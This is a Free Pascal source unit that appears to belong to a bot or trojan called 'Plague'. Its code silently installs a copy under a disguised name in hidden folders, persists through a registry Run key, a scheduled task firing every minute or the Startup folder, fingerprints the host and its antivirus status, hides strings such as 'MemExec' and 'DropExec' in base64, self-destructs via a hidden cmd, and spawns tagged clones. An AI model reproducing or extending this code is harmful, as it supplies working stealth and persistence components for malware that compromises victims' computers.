unit Tools;

{$mode objfpc}{$H+}

interface

uses
  Classes, Windows, Registry, SysUtils, ActiveX, ComObj,
  Variants, StrUtils, INIFiles, Process, Base64;

function GetGUID: String;
procedure AnalyzeSystem;
procedure LoadSettings;
procedure UpdateResourceSettings(ExeName: String);
procedure DoFirstRun;
procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
procedure Initialize;
procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
procedure DeleteTask(ATaskName: String);
function Adler32(Str: String): LongWord;
procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
function TaskExists(ATaskName: String): Boolean;
procedure Reg_RemoveFromStartup;
function StartupFolder: String;
function ChDel(FileName: String): Boolean;
procedure Selfdestruct;
procedure MutexMagic;
function CreateClone(CloneName: String): Boolean;
function TerminateProcessByID(ProcessID: Cardinal): Boolean;
procedure CheckProxy;
procedure AddProcessToList(PID: Cardinal);
procedure RemoveProcessFromList(PID: Cardinal);
procedure OpenURL(URL: String);
function ChCopy(Source, Dest: String): Boolean;
function GetProtectedString(Num: Word): String;

var
  Nick, OS, ComputerName, UserName, CPU, GPU: String;
  AVName, AVState: String;
  Base, InternalName, FileName, FullName, Server, ID: String;
  Discriminator: LongWord;
  Delay: LongInt;

  Mutex: THandle;

  MSet: TMemoryStream;
  Settings: TMemINIFile;

  UsingProxy: Boolean;
  ProxyIP: String;
  ProxyPort: Cardinal;

  _C: Word = 0;
  ChildProc: Array of Cardinal;

implementation

const
  MOD_ADLER = 65521;
  ERROR_ALREADY_EXIST = 183;

var
  Reg: TRegistry;

procedure Initialize;
Begin
  ID:=GetGUID;
  Discriminator:=Adler32(ID);
  Nick:=Settings.ReadString('Install', 'Prefix', 'Client-')+LeftStr(ID, Pos('-', ID) - 1);
  Server:=Settings.ReadString('General', 'Server', 'http://localhost');
  Delay:=Settings.ReadInteger('General', 'Delay', 5000);
  FullName:=ParamStr(0);
  FileName:=ExtractFileName(FullName);
  InternalName:=Settings.ReadString('Install', 'InternalName', 'winmgr.exe');
  Case Settings.ReadString('Install', 'BaseLocation', 'Temporary Directory') of
    'Temporary Directory': Base:=GetEnvironmentVariable('Temp');
    'Application Data': Base:=GetEnvironmentVariable('AppData');
    'Local Application Data': Base:=GetEnvironmentVariable('LocalAppData');
    'My Documents': Base:=GetEnvironmentVariable('UserProfile')+'\Documents';
    'Favorites': Base:=GetEnvironmentVariable('UserProfile')+'\Favorites';
    'Saved Games': Base:=GetEnvironmentVariable('UserProfile')+'\Saved Games';
  end;
  Base:=IncludeTrailingBackslash(Base) + Settings.ReadString('Install', 'BaseName', 'Plague');
  if RightStr(Base, 1)='\' then Delete(Base, Length(Base), 1);
end;

function GetProtectedString(Num: Word): String;
Begin
  Case Num of
    0: Result:='Y29uZmlnLmpzb24=';
    1: Result:='TWVtRXhlYw==';
    2: Result:='RHJvcEV4ZWM=';
    3: Result:='RG93bmxvYWQgc3VjY2Vzc2Z1bC4=';
  end;
  Result:=DecodeStringBase64(Result);
end;

procedure MutexMagic;
Begin
  Mutex:=CreateMutex(Nil, True, PChar(Settings.ReadString('General', 'Mutex', 'Plague')));
  if GetLastError=ERROR_ALREADY_EXIST then Halt(0);
end;

function ChCopy(Source, Dest: String): Boolean;
Begin
  CopyFile(PChar(Source), PChar(Dest), False);
  Result:=FileExists(Dest);
end;

procedure AddProcessToList(PID: Cardinal);
Begin
  Inc(_C);
  SetLength(ChildProc, _C);
  ChildProc[_C - 1]:=PID;
End;

procedure OpenURL(URL: String);
Begin
  ShellExecuteW(0, 'open', PWideChar(WideString(URL)), Nil, Nil, SW_SHOWNORMAL);
end;

procedure RemoveProcessFromList(PID: Cardinal);
var
  J, I: LongInt;
Begin
  I:=-1;
  For J:=0 to _C-1 do
    if ChildProc[J]=PID then Begin
      I:=J;
      Break;
    end;
  if I>-1 then Begin
    For J:=I to _C-2 do
      ChildProc[J]:=ChildProc[J+1];
    Dec(_C);
    SetLength(ChildProc, _C);
  end;
end;

procedure Selfdestruct;
var
  M: TProcess;
Begin
  FileSetAttr(Base+'\'+InternalName, faNormal);
  FileSetAttr(Base, faDirectory);
  M:=TProcess.Create(Nil);
  M.Executable:='cmd';
  M.Parameters.Add('/C timeout 5 & del /F /Q "'+Base+'\*.*" & rmdir "'+Base+'"');
  M.InheritHandles:=False;
  M.CurrentDirectory:='C:\';
  M.ShowWindow:=swoHIDE;
  M.Execute;
  M.Free;
end;

function ChDel(FileName: String): Boolean;
Begin
  Result:=True;
  if FileExists(FileName) then Begin
    FileSetAttr(FileName, faNormal);
    Result:=DeleteFile(FileName);
  end;
end;

function StartupFolder: String;
Begin
  Result:=IncludeTrailingBackslash(GetEnvironmentVariable('AppData'))+'Microsoft\Windows\Start Menu\Programs\Startup';
end;

function Reg_AddToStartup: Boolean;
Begin
  Result:=True;
  try
    Reg:=TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
    Reg.RootKey:=HKEY_CURRENT_USER;
    Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
    Reg.WriteString('WinManager', Base+'\'+InternalName);
    Result:=Reg.ValueExists('WinManager');
    Reg.Free;
  except
    Result:=False;
  end;
end;

procedure CheckProxy;
var
  S: String;
Begin
  try
    Reg:=TRegistry.Create(KEY_READ or KEY_WOW64_64KEY);
    Reg.RootKey:=HKEY_CURRENT_USER;
    Reg.OpenKeyReadOnly('Software\Microsoft\Windows\CurrentVersion\Internet Settings');
    UsingProxy:=Reg.ReadBool('ProxyEnable');
    S:=Reg.ReadString('ProxyServer');
    Reg.Free;
    if UsingProxy then Begin
      ProxyIP:=LeftStr(S, Pos(':', S) - 1);
      Delete(S, 1, Pos(':', S));
      ProxyPort:=StrToInt(S);
    end;
  except
    UsingProxy:=False;
  end;
end;

procedure Reg_RemoveFromStartup;
Begin
  try
    Reg:=TRegistry.Create(KEY_WRITE OR KEY_WOW64_64KEY);
    Reg.RootKey:=HKEY_CURRENT_USER;
    Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', False);
    Reg.DeleteValue('WinManager');
    Reg.Free;
  except
  end;
end;

function Task_AddToStartup: Boolean;
Begin
  ScheduleTask('WinManager', Base+'\'+InternalName, '1M');
  Result:=TaskExists('WinManager');
end;

procedure Auto_AddToStartup;
var
  S: String;
Begin
  if Not(Task_AddToStartup) then
  if Not(Reg_AddToStartup) then Begin
    S:=StartupFolder;
    if Not(DirectoryExists(S)) then MkDir(S);
    CopyFile(PChar(FullName), PChar(S+'\'+InternalName), False);
    FileSetAttr(S+'\'+InternalName, faSysFile{%H-} or faHidden{%H-});
  end;
end;

procedure DoFirstRun;
Begin
  //Install the bot
  if Not(DirectoryExists(Base)) then Begin
    MkDir(Base);
    FileSetAttr(Base, faSysFile{%H-} or faHidden{%H-});
  end;
  CopyFile(PChar(FullName), PChar(Base+'\'+InternalName), False);
  //Add to StartUp
  Case Settings.ReadInteger('Install', 'Startup', 3) of
    1: Reg_AddToStartup;
    2: Task_AddToStartup;
    3: Auto_AddToStartup;
  end;
  //Modify the settings
  Settings.WriteInteger('General', 'FirstRun', 0);
  UpdateResourceSettings(Base+'\'+InternalName);
  FileSetAttr(Base+'\'+InternalName, faSysFile{%H-} or faHidden{%H-});
  Restart(Base+'\'+InternalName);
  MSet.Free;
  Settings.Free;
  Halt(0);
end;

function GetGUID: String;
Begin
  try
    Reg:=TRegistry.Create(KEY_READ OR KEY_WOW64_64KEY);
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKeyReadOnly('SOFTWARE\Microsoft\Cryptography');
    Result:=UpperCase(Reg.ReadString('MachineGuid'));
  finally
    Reg.Free;
  end;
end;

function GetAVState(Str: String): String;
var
  Index: Array [1..3] of Byte;
  A: String;
Begin
  Result:='';
  A:=IntToHex(StrToInt(Str), 6);
  Index[1]:=StrToInt(A[1]+A[2]);
  Index[2]:=StrToInt(A[3]+A[4]);
  Index[3]:=StrToInt(A[5]+A[6]);
  A:=IntToBin(Index[1], 8);
  if A[8]='1' then Result:='Firewall, ';
  if A[7]='1' then Result+='Auto-Update, ';
  if A[6]='1' then Result+='Antivirus, ';
  if A[5]='1' then Result+='Antispyware, ';
  if A[4]='1' then Result+='Internet-Settings, ';
  if A[3]='1' then Result+='UAC, ';
  if A[2]='1' then Result+='Custom Service, ';
  if Length(Result)=0 then Result:='No Protection'
  else Begin
    Delete(Result, Length(Result) - 1, 2);
  end;
  Result+=' - ';
  if Index[2]=10 then Result+='Active, '
  else Result+='Suspended, ';
  if Index[3]=0 then Result+='Up To Date'
  else Result+='Outdated';
end;

function GetWMIObject(const objectName: String): IDispatch;
var
  chEaten: PULONG;
  BindCtx: IBindCtx;
  Moniker: IMoniker;
begin
  OleCheck(CreateBindCtx(0, bindCtx));
  OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten, Moniker));
  OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, Result));
end;

function FormatSP(Str: String): String;
Begin
  if Length(Str)>2 then Result:=' ('+Str+')'
  else Result:='';
end;

procedure AnalyzeSystem;
var objWMIService : OLEVariant;
    colItems      : OLEVariant;
    colItem       : OLEVariant;
    oEnum         : IEnumvariant;
    iValue        : LongWord;
Begin
 try
 CoInitialize(Nil);
 //Computer Information
 objWMIService := GetWMIObject('winmgmts:\\localhost\root\CIMV2');
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_OperatingSystem','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   OS:=VarToStr(colItem.Caption)+' '+VarToStr(colItem.OSArchitecture)+
       FormatSP(VarToStr(colItem.CSDVersion));
   ComputerName:=VarToStr(colItem.CSName);
   UserName:=VarToStr(ColItem.RegisteredUser);
 end;
 //CPU Information
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_Processor','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   CPU:=VarToStr(colItem.Name);
 end;
 //GPU Information
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_VideoController','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   GPU:=VarToStr(colItem.Name);
 end;
 //Antivirus Information
 objWMIService := GetWMIObject('winmgmts:\\localhost\root\SecurityCenter2');
 colItems      := objWMIService.ExecQuery('SELECT * FROM AntiVirusProduct','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   AVName:=VarToStr(colItem.displayName);
   AVState:=GetAVState(VarToStr(colItem.productState));
 end;
 CoUninitialize;
 except
   OS:=GetEnvironmentVariable('OS')+' '+GetEnvironmentVariable('PROCESSOR_ARCHITECTURE');
   ComputerName:=GetEnvironmentVariable('COMPUTERNAME');
   UserName:=GetEnvironmentVariable('USERNAME');
   CPU:=GetEnvironmentVariable('PROCESSOR_IDENTIFIER');
   GPU:='Unknown';
   AVName:='Unknown';
   AVState:='Unknown';
 end;
end;

procedure LoadSettings;
var
  Res: TResourceStream;
Begin
  Res:=TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  MSet:=TMemoryStream.Create;
  MSet.LoadFromStream(Res);
  Res.Free;
  Settings:=TMemINIFile.Create(MSet);
end;

procedure ReloadSettings;
Begin
  MSet.Free;
  Settings.Free;
  LoadSettings;
end;

procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
var
  M: TProcess;
  Res: TResourceStream;
  S: TStringList;
  Tmp: String;

procedure Act(Index: LongInt; Pattern, Input: String);
Begin
  S.Strings[Index-1]:=StringReplace(S.Strings[Index-1], Pattern, Input, []);
end;

Begin
  //Load template
  Res:=TResourceStream.Create(HInstance, 'NewTask', RT_RCDATA);
  S:=TStringList.Create;
  S.LoadFromStream(Res);
  Res.Free;
  //Actualize template
  Act(4, '{DATE_TIME}', FormatDateTime('yyyy-mm-dd"T"h:m:s', Now));
  Tmp:=GetEnvironmentVariable('Username');
  Act(5, '{USERNAME}', Tmp);
  Act(10, '{INTERVAL}', AInterval);
  Act(13, '{START_DATE_TIME}', FormatDateTime('yyyy-mm-dd"T"h:m:"00"', Now));
  Act(19, '{COMPUTER_NAME}', GetEnvironmentVariable('ComputerName'));
  Act(19, '{USERNAME}', Tmp);
  Act(47, '{COMMAND}', AFileName);
  //Save XML
  Tmp:=IncludeTrailingBackslash(GetEnvironmentVariable('Temp'))+'NewTask.xml';
  S.SaveToFile(Tmp);
  S.Free;
  //Add Task
  M:=TProcess.Create(Nil);
  M.Executable:='schtasks';
  M.ShowWindow:=swoHIDE;
  M.Options:=[poWaitOnExit];
  M.Parameters.Add('/Create');
  M.Parameters.Add('/TN "'+ATaskName+'"');
  M.Parameters.Add('/XML "'+Tmp+'"');
  M.Execute;
  M.Free;
  //Delete XML
  DeleteFile(Tmp);
end;

procedure DeleteTask(ATaskName: String);
var
  M: TProcess;
Begin
  M:=TProcess.Create(Nil);
  M.Executable:='schtasks';
  M.ShowWindow:=swoHIDE;
  M.Options:=[poWaitOnExit];
  M.Parameters.Add('/Delete');
  M.Parameters.Add('/F');
  M.Parameters.Add('/TN "'+ATaskName+'"');
  M.Execute;
  M.Free;
end;

function TaskExists(ATaskName: String): Boolean;
var
  M: TProcess;
  S: TStringList;
Begin
  M:=TProcess.Create(Nil);
  try
    M.Executable:='schtasks';
    M.ShowWindow:=swoHIDE;
    M.Options:=[poWaitOnExit, poUsePipes, poStderrToOutPut];
    M.Parameters.Add('/Query');
    M.Parameters.Add('/FO "LIST"');
    M.Parameters.Add('/TN "'+ATaskName+'"');
    M.Execute;
    S:=TStringList.Create;
    S.LoadFromStream(M.Output);
    Result:=(Pos('ERROR:', S.Text)=0);
    S.Free;
  except
    Result:=False;
  end;
  M.Free;
End;

procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
var
  Params: String = '/wait';
Begin
  if RemoveOldCopy then Params += ' /removeold';
  ShellExecute(0, nil, PChar(ExeName), PChar(Params), nil, SW_SHOWNORMAL);
end;

procedure UpdateResourceSettings(ExeName: String);
var
  Res: THandle;
  Str: TStringList;
Begin
  Str:=TStringList.Create;
  Settings.GetStrings(Str);
  Res:=BeginUpdateResource(PChar(ExeName), False);
  UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, @Str.Text[1], Length(Str.Text));
  EndUpdateResource(Res, False);
  Str.Free;
end;

function Adler32(Str: String): LongWord;
var
  I: LongInt;
  A, B: LongWord;
Begin
  A:=1;
  B:=0;
  For I:=1 to Length(Str) do Begin
    A:=(A + Ord(Str[I])) mod MOD_ADLER;
    B:=(B + A) mod MOD_ADLER;
  end;
  Result:=(B shl 16) or A;
End;

procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
var
   InMS: TMemoryStream;
   cnt: Integer;
   C: byte;
begin
  C:=0;
  InMS := TMemoryStream.Create;
  try
    InMS.CopyFrom(MS, MS.Size);
    InMS.Position := 0;
    MS.Clear;
    for cnt := 0 to InMS.Size - 1 do
      begin
        InMS.Read(C, 1) ;
        C := (C xor not (ord(Key shr cnt)));
        MS.Write(C, 1) ;
      end;
  finally
    InMS.Free;
  end;
  MS.Position:=0;
end;

function TerminateProcessByID(ProcessID: Cardinal): Boolean;
var
  hProcess : THandle;
begin
  Result := False;
  hProcess := OpenProcess(PROCESS_TERMINATE,False,ProcessID);
  if hProcess > 0 then
  try
    Result := TerminateProcess(hProcess,0);
  finally
    CloseHandle(hProcess);
  end;
end;

function CreateClone(CloneName: String): Boolean;
var
  Tmp: String;
Begin
  Result:=CopyFile(PChar(FullName), PChar(CloneName), False);
  FileSetAttr(CloneName, faNormal);
  if Result then Begin
    Tmp:=Settings.ReadString('General', 'InfectedBy', 'Unknown');
    Settings.WriteString('General', 'InfectedBy', ID);
    Settings.WriteInteger('General', 'FirstRun', 1);
    UpdateResourceSettings(CloneName);
    Settings.WriteInteger('General', 'FirstRun', 0);
    Settings.WriteString('General', 'InfectedBy', Tmp);
  end;
end;

end.

